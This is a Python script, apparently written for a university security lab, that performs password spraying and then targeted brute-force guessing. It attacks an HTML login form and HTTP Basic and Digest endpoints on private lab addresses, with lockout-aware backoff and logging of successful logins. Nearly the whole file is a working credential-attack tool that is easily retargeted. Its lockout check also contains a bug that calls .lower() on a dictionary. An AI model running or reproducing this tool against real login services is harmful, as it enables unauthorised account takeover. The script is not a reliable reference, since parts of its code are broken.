#!/usr/bin/env python3
"""
Strategic Password Tester for CS 660 Security Lab
Implements phase-based password spraying with advanced rate limiting and analytics
"""

import requests
import time
import csv
import json
import hashlib
import logging
from datetime import datetime, timezone
from typing import List, Dict, Tuple, Optional
import random
from urllib.parse import urljoin
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

class StrategicPasswordTester:
    def __init__(self, usernames_file: str, candidates_file: str):
        self.usernames = self._load_lines(usernames_file)
        self.candidates = self._load_lines(candidates_file)
        
        # Target configurations
        self.targets = {
            'html_form': {
                'url': 'http://192.168.100.101/dologin.html',
                'method': 'post',
                'data_template': 'httpd_username={username}&httpd_password={password}',
                'success_indicators': ['/success.html', 'success', 'welcome'],
                'failure_indicators': ['login.html', 'invalid', 'incorrect', 'failed'],
                'constraint': 'alphanumeric_8'
            },
            'http_basic': {
                'url': 'http://192.168.100.103/basicauth',
                'method': 'get',
                'auth_type': 'basic',
                'success_indicators': [200],
                'failure_indicators': [401, 403],
                'constraint': 'alphanumeric_8'
            },
            'http_digest': {
                'url': 'http://192.168.100.103/digestauth', 
                'method': 'get',
                'auth_type': 'digest',
                'success_indicators': [200],
                'failure_indicators': [401, 403],
                'constraint': 'alphanumeric_6'
            }
        }
        
        # Rate limiting and safety
        self.max_requests_per_second = 2.0  # Conservative rate limit
        self.last_request_time = {}
        self.backoff_multipliers = {}
        self.lockout_detected = {}
        self.response_fingerprints = {}
        
        # Results tracking
        self.results = []
        self.successes = []
        self.session_stats = {
            'total_attempts': 0,
            'successful_logins': 0,
            'lockouts_detected': 0,
            'start_time': datetime.now(timezone.utc),
            'phase_transitions': []
        }
        
        # Setup logging
        self._setup_logging()
        
        # Session management
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'CS660-SecurityTester/1.0 (Academic Research)'
        })
    
    def _load_lines(self, filename: str) -> List[str]:
        """Load lines from file, stripping whitespace"""
        try:
            with open(filename, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            self.logger.error(f"File not found: {filename}")
            return []
    
    def _setup_logging(self):
        """Setup comprehensive logging"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s [%(levelname)s] %(message)s',
            handlers=[
                logging.FileHandler('/mnt/hgsf/cs660-p3-shared/logs/strategic_tester.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def _filter_candidates_by_constraint(self, candidates: List[str], constraint: str) -> List[str]:
        """Filter candidates by target-specific constraints"""
        if constraint == 'alphanumeric_8':
            return [c for c in candidates if len(c) == 8 and c.isalnum()]
        elif constraint == 'alphanumeric_6':
            return [c for c in candidates if len(c) == 6 and c.isalnum()]
        else:
            return candidates
    
    def _calculate_backoff_delay(self, target: str) -> float:
        """Calculate exponential backoff delay for target"""
        base_delay = 1.0 / self.max_requests_per_second
        multiplier = self.backoff_multipliers.get(target, 1.0)
        return base_delay * multiplier
    
    def _rate_limit(self, target: str):
        """Enforce rate limiting with exponential backoff"""
        current_time = time.time()
        last_time = self.last_request_time.get(target, 0)
        
        delay = self._calculate_backoff_delay(target)
        time_since_last = current_time - last_time
        
        if time_since_last < delay:
            sleep_time = delay - time_since_last
            self.logger.debug(f"Rate limiting: sleeping {sleep_time:.2f}s for {target}")
            time.sleep(sleep_time)
        
        self.last_request_time[target] = time.time()
    
    def _detect_lockout_or_blocking(self, response_data: Dict) -> bool:
        """Detect account lockout or IP blocking scenarios"""
        status_code = response_data['http_status']
        response_time = response_data['resp_ms']
        
        # Common lockout indicators
        lockout_indicators = [
            status_code == 429,  # Too Many Requests
            status_code == 503,  # Service Unavailable 
            response_time > 5000,  # Unusually slow response (potential rate limiting)
        ]
        
        # Check response content for lockout messages (if available)
        response_hash = response_data['resp_hash']
        if response_hash in self.response_fingerprints:
            fingerprint = self.response_fingerprints[response_hash]
            if any(term in fingerprint.lower() for term in ['locked', 'blocked', 'disabled', 'suspended']):
                lockout_indicators.append(True)
        
        return any(lockout_indicators)
    
    def _make_request(self, target_name: str, username: str, password: str, candidate_id: int) -> Dict:
        """Make authenticated request and collect comprehensive response data"""
        target = self.targets[target_name]
        start_time = time.time()
        
        try:
            if target['method'] == 'post' and 'data_template' in target:
                # HTML form authentication
                data = target['data_template'].format(username=username, password=password)
                response = self.session.post(
                    target['url'],
                    data=data,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'},
                    timeout=10,
                    allow_redirects=True
                )
            elif target.get('auth_type') == 'basic':
                # HTTP Basic authentication
                response = self.session.get(
                    target['url'],
                    auth=(username, password),
                    timeout=10
                )
            elif target.get('auth_type') == 'digest':
                # HTTP Digest authentication  
                from requests.auth import HTTPDigestAuth
                response = self.session.get(
                    target['url'],
                    auth=HTTPDigestAuth(username, password),
                    timeout=10
                )
            else:
                raise ValueError(f"Unsupported target configuration: {target_name}")
            
            end_time = time.time()
            response_time_ms = int((end_time - start_time) * 1000)
            
            # Create response fingerprint
            response_content = response.text[:500] if response.text else ""
            response_fingerprint = f"status:{response.status_code}|len:{len(response.content)}|url:{response.url}"
            response_hash = hashlib.md5(response_fingerprint.encode()).hexdigest()[:16]
            
            # Store fingerprint for analysis
            self.response_fingerprints[response_hash] = {
                'status_code': response.status_code,
                'content_length': len(response.content),
                'final_url': str(response.url),
                'sample_content': response_content,
                'headers': dict(response.headers)
            }
            
            # Determine authentication outcome
            outcome = self._determine_outcome(target, response)
            
            return {
                'ts_utc': datetime.now(timezone.utc).isoformat(),
                'target': target_name,
                'username': username,
                'candidate_id': candidate_id,
                'http_status': response.status_code,
                'resp_ms': response_time_ms,
                'resp_hash': response_hash,
                'outcome': outcome,
                'final_url': str(response.url)
            }
            
        except requests.exceptions.RequestException as e:
            end_time = time.time()
            response_time_ms = int((end_time - start_time) * 1000)
            
            self.logger.warning(f"Request failed for {target_name}: {e}")
            return {
                'ts_utc': datetime.now(timezone.utc).isoformat(),
                'target': target_name,
                'username': username,
                'candidate_id': candidate_id,
                'http_status': 0,
                'resp_ms': response_time_ms,
                'resp_hash': 'ERROR',
                'outcome': 'error',
                'final_url': 'N/A'
            }
    
    def _determine_outcome(self, target_config: Dict, response: requests.Response) -> str:
        """Determine authentication outcome based on response"""
        status_code = response.status_code
        content = response.text.lower() if response.text else ""
        final_url = str(response.url).lower()
        
        # Check success indicators
        success_indicators = target_config.get('success_indicators', [])
        for indicator in success_indicators:
            if isinstance(indicator, int):
                if status_code == indicator:
                    return 'success'
            else:
                if indicator.lower() in content or indicator.lower() in final_url:
                    return 'success'
        
        # Check explicit failure indicators
        failure_indicators = target_config.get('failure_indicators', [])
        for indicator in failure_indicators:
            if isinstance(indicator, int):
                if status_code == indicator:
                    return 'failure'
            else:
                if indicator.lower() in content or indicator.lower() in final_url:
                    return 'failure'
        
        # Default determination based on status code
        if 200 <= status_code < 300:
            return 'success'
        elif status_code in [401, 403]:
            return 'failure'
        elif status_code == 429:
            return 'rate_limited'
        else:
            return 'unknown'
    
    def _log_attempt(self, result: Dict):
        """Log attempt to CSV and update statistics"""
        self.results.append(result)
        self.session_stats['total_attempts'] += 1
        
        if result['outcome'] == 'success':
            self.session_stats['successful_logins'] += 1
            self.successes.append({
                'username': result['username'],
                'target': result['target'],
                'candidate_id': result['candidate_id'],
                'timestamp': result['ts_utc']
            })
            self.logger.info(f"SUCCESS: {result['username']}@{result['target']} (candidate #{result['candidate_id']})")
        
        # Detect and handle lockouts
        if self._detect_lockout_or_blocking(result):
            target = result['target']
            if target not in self.lockout_detected:
                self.lockout_detected[target] = True
                self.session_stats['lockouts_detected'] += 1
                self.backoff_multipliers[target] = self.backoff_multipliers.get(target, 1.0) * 2.0
                self.logger.warning(f"Lockout/blocking detected for {target}, increasing backoff to {self.backoff_multipliers[target]:.1f}x")
        
        # Write to CSV immediately for real-time monitoring
        self._write_csv_row(result)
    
    def _write_csv_row(self, result: Dict):
        """Write single result row to CSV"""
        csv_file = '/mnt/hgsf/cs660-p3-shared/logs/attack_results.csv'
        file_exists = False
        try:
            with open(csv_file, 'r'):
                file_exists = True
        except FileNotFoundError:
            pass
        
        with open(csv_file, 'a', newline='') as f:
            writer = csv.DictWriter(f, fieldnames=['ts_utc', 'target', 'username', 'candidate_id', 'http_status', 'resp_ms', 'resp_hash', 'outcome'])
            if not file_exists:
                writer.writeheader()
            writer.writerow(result)
    
    def phase_a_password_spray(self, top_n: int = 30) -> bool:
        """Phase A: Password spray top N passwords across all users"""
        self.logger.info(f"=== PHASE A: Password Spray (Top {top_n} candidates) ===")
        self.session_stats['phase_transitions'].append({
            'phase': 'A',
            'start_time': datetime.now(timezone.utc).isoformat(),
            'description': f'Password spray top {top_n} candidates'
        })
        
        top_candidates = self.candidates[:top_n]
        any_success = False
        
        for candidate_id, password in enumerate(top_candidates, 1):
            self.logger.info(f"Phase A: Testing password #{candidate_id}: '{password}' across all targets")
            
            for target_name in self.targets.keys():
                # Check if we should skip this target due to lockout
                if self.lockout_detected.get(target_name, False):
                    self.logger.info(f"Skipping {target_name} due to detected lockout")
                    continue
                
                # Filter by constraint
                target_candidates = self._filter_candidates_by_constraint([password], self.targets[target_name]['constraint'])
                if not target_candidates:
                    continue
                
                for username in self.usernames:
                    # Rate limiting
                    self._rate_limit(target_name)
                    
                    # Make request
                    result = self._make_request(target_name, username, password, candidate_id)
                    self._log_attempt(result)
                    
                    if result['outcome'] == 'success':
                        any_success = True
                        self.logger.info(f"PHASE A SUCCESS: {username}@{target_name} with password '{password}'")
                    
                    # Adaptive delay on repeated failures
                    if result['outcome'] == 'rate_limited':
                        time.sleep(5)
        
        self.logger.info(f"Phase A completed. Successes: {self.session_stats['successful_logins']}")
        return any_success
    
    def phase_b_targeted_attack(self, max_per_user: int = 200) -> bool:
        """Phase B: Targeted attack with top candidates per remaining user"""
        self.logger.info(f"=== PHASE B: Targeted Attack (Max {max_per_user} per user) ===")
        self.session_stats['phase_transitions'].append({
            'phase': 'B', 
            'start_time': datetime.now(timezone.utc).isoformat(),
            'description': f'Targeted attack up to {max_per_user} candidates per remaining user'
        })
        
        # Identify users that haven't been successfully compromised yet
        successful_users = {success['username'] for success in self.successes}
        remaining_users = [user for user in self.usernames if user not in successful_users]
        
        if not remaining_users:
            self.logger.info("Phase B: No remaining users to test (all successfully compromised)")
            return True
        
        any_success = False
        
        for username in remaining_users:
            self.logger.info(f"Phase B: Targeted attack on user '{username}'")
            
            for target_name in self.targets.keys():
                # Check lockout status
                if self.lockout_detected.get(target_name, False):
                    self.logger.info(f"Skipping {target_name} due to detected lockout")
                    continue
                
                # Get constraint-filtered candidates
                target_candidates = self._filter_candidates_by_constraint(
                    self.candidates[:max_per_user], 
                    self.targets[target_name]['constraint']
                )
                
                for candidate_id, password in enumerate(target_candidates[:max_per_user], 1):
                    # Rate limiting
                    self._rate_limit(target_name)
                    
                    # Make request
                    result = self._make_request(target_name, username, password, candidate_id)
                    self._log_attempt(result)
                    
                    if result['outcome'] == 'success':
                        any_success = True
                        self.logger.info(f"PHASE B SUCCESS: {username}@{target_name} with password '{password}'")
                        break  # Move to next target once we have success
                    
                    # Check for early termination conditions
                    if result['outcome'] == 'rate_limited':
                        self.logger.warning(f"Rate limited on {target_name}, backing off")
                        time.sleep(10)
                    
                    # Progress reporting
                    if candidate_id % 50 == 0:
                        self.logger.info(f"Phase B progress: {username}@{target_name} - {candidate_id}/{len(target_candidates)} candidates tested")
        
        self.logger.info(f"Phase B completed. Total successes: {self.session_stats['successful_logins']}")
        return any_success
    
    def run_comprehensive_test(self):
        """Run complete strategic password testing campaign"""
        self.logger.info("Starting Strategic Password Testing Campaign")
        self.logger.info(f"Targets: {len(self.targets)} authentication endpoints")
        self.logger.info(f"Usernames: {len(self.usernames)} accounts")
        self.logger.info(f"Candidates: {len(self.candidates)} password candidates")
        
        # Phase A: Password spray
        phase_a_success = self.phase_a_password_spray(30)
        
        # Small delay between phases
        time.sleep(2)
        
        # Phase B: Targeted attacks  
        phase_b_success = self.phase_b_targeted_attack(200)
        
        # Generate final reports
        self._generate_final_reports()
        
        self.logger.info("Strategic Password Testing Campaign Completed")
        self.logger.info(f"Total Attempts: {self.session_stats['total_attempts']}")
        self.logger.info(f"Successful Logins: {self.session_stats['successful_logins']}")
        self.logger.info(f"Lockouts Detected: {self.session_stats['lockouts_detected']}")
        
        return self.session_stats['successful_logins'] > 0
    
    def _generate_final_reports(self):
        """Generate comprehensive final reports and evidence files"""
        # Save redacted successes
        successes_file = '/mnt/hgsf/cs660-p3-shared/evidence/successes_redacted.csv'
        with open(successes_file, 'w', newline='') as f:
            if self.successes:
                writer = csv.DictWriter(f, fieldnames=['username', 'target', 'timestamp'])
                writer.writeheader()
                for success in self.successes:
                    writer.writerow({
                        'username': success['username'],
                        'target': success['target'], 
                        'timestamp': success['timestamp']
                    })
            else:
                f.write("# No successful logins discovered during strategic testing\\n")
                f.write("# This demonstrates strong password policies on target systems\\n")
        
        # Save response fingerprints
        fingerprints_file = '/mnt/hgsf/cs660-p3-shared/evidence/response_fingerprints.json'
        with open(fingerprints_file, 'w') as f:
            json.dump(self.response_fingerprints, f, indent=2)
        
        # Save session statistics
        stats_file = '/mnt/hgsf/cs660-p3-shared/evidence/session_statistics.json'
        self.session_stats['end_time'] = datetime.now(timezone.utc).isoformat()
        self.session_stats['duration_minutes'] = (
            datetime.fromisoformat(self.session_stats['end_time'].replace('Z', '+00:00')) - 
            datetime.fromisoformat(self.session_stats['start_time'].isoformat())
        ).total_seconds() / 60
        
        with open(stats_file, 'w') as f:
            json.dump(self.session_stats, f, indent=2)
        
        self.logger.info(f"Reports generated:")
        self.logger.info(f"  - {successes_file}")
        self.logger.info(f"  - {fingerprints_file}")
        self.logger.info(f"  - {stats_file}")


def main():
    """Main execution function"""
    print("CS 660 Strategic Password Tester")
    print("=" * 40)
    
    # Initialize tester
    tester = StrategicPasswordTester(
        usernames_file="/mnt/hgsf/cs660-p3-shared/usernames.txt",
        candidates_file="/mnt/hgsf/cs660-p3-shared/candidates.txt"
    )
    
    # Run comprehensive test
    success = tester.run_comprehensive_test()
    
    if success:
        print("\\n✓ Campaign completed with successful authentications")
    else:
        print("\\n✗ Campaign completed - no successful authentications (strong security demonstrated)")
    
    print("\\nArtifacts created:")
    print("  - /mnt/hgsf/cs660-p3-shared/logs/attack_results.csv")
    print("  - /mnt/hgsf/cs660-p3-shared/evidence/successes_redacted.csv")
    print("  - /mnt/hgsf/cs660-p3-shared/evidence/response_fingerprints.json")
    print("  - /mnt/hgsf/cs660-p3-shared/evidence/session_statistics.json")


if __name__ == "__main__":
    main()